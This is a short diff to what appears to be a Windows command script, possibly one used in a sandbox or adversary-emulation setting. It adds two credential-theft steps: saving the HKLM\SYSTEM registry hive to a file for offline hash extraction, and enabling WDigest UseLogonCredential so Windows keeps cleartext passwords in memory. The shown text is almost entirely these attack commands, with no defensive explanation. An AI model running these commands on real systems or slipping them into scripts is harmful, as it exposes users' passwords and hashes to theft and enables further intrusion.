@@ -17,6 +17,6 @@ whoami
 
 xcopy %USERPROFILE%\\Desktop\\SandboxFiles .  /H  /Y
 
-reg save
+reg save HKLM\SYSTEM c:\system.save
 
-reg add
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
